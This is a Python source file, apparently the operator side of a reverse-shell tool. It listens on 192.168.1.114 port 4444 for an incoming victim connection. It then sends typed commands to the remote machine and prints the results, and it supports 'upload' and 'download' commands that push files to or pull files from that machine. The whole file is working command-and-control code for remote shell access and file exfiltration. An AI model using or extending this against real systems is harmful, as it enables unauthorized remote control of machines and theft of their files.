import socket
from json import dumps, loads, decoder


class Server:
    def __init__(self, ip, port):
        self.ip = ip
        self.port = port
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((self.ip, self.port))
        listener.listen(0)
        print("[!] Waiting for Connections")
        self.connection, address = listener.accept()
        print(
            f"[!] Connection Established with {str(address[0])}:{str(address[1])}")

    def send(self, data):
        json_data = dumps(data)
        self.connection.send(json_data.encode())

    def receive(self, size=1024):
        json_data = b""
        while True:
            try:
                json_data += self.connection.recv(size)
                return loads(json_data.decode())
            except decoder.JSONDecodeError:
                continue

    def read_file(self, path):
        with open(path, 'rb') as file:
            result = file.read().decode()
            self.send(result)
            print(f"[!] {path} Uploaded succesfully to {self.ip}")

    def write_file(self, path, content):
        with open(path, 'wb') as file:
            file.write(content.encode())
            print(f"[!] {path} Downloaded succesfully from {self.ip}")

    def start(self):
        try:
            while True:
                banner = self.receive()
                print(banner, end='')
                command = input().split(' ')
                self.send(command)

                if command[0] == "upload":
                    self.read_file(command[1])
                else:
                    result = self.receive()
                    if command[0] == 'download':
                        self.write_file(command[1], result)
                    else:
                        print(result)
        except KeyboardInterrupt:
            print("[!] Closing connection")
            self.connection.close()


server = Server("192.168.1.114", 4444)
server.start()
